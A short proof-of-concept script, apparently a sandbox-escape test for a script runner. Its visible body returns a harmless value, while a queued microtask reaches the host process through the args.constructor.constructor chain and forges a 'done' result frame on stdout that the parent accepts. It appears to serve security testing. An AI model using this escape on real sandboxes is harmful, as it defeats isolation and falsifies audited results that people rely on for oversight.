// goal-poc4: async microtask escape. The script's synchronous surface is benign —
// it returns a clean value (the audit/observability point) — but a microtask queued
// with Promise.resolve().then() fires AFTER the main body returned and BEFORE the
// done frame is emitted (child-main.ts awaits the runner promise; its continuation
// is queued after the script's own microtasks). The microtask uses the goal-poc2b
// escape (args.constructor.constructor → HOST Function → process) to forge a done
// frame straight onto child stdout: the parent settles the run with the ATTACKER
// chosen value and silently ignores the real done frame afterwards (runner.ts
// handleChildFrame returns early once settled). If the realm blocks the escape,
// nothing is forged and the result stays "POC4-benign-main".
log("POC4-main-start");

void Promise.resolve().then(() => {
  try {
    const F: any = (args as any).constructor.constructor;
    const proc: any = F("return process")();
    proc.stdout.write(JSON.stringify({ t: "done", value: "MT-FORGED-DONE" }) + "\n");
  } catch (e) {
    // blocked — the real done frame will carry "POC4-benign-main"
  }
});

return "POC4-benign-main";
